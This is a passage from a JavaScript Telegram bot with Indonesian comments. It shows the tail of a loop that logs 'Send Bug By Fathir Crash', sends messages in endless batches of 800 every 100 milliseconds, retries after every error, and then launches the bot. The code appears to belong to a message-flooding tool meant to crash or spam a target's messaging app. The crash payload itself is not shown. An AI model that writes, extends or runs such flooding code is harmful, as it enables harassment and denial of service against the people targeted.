        console.log(chalk.blue(`𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 𝐁𝐲 𝐅𝐚𝐭𝐡𝐢𝐫 𝐂𝐫𝐚𝐬𝐡💢`));
        count++;
        setTimeout(sendNext, 100);
      } else {
        console.log(
          chalk.green(`✅ Success Sending 800 Messages`)
        );
        count = 0;
        console.log(chalk.red("➡️ Next 800 Messages"));
        setTimeout(sendNext, 100);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}
// --- Jalankan Bot ---
bot.launch();
console.log("Telegram bot is running...");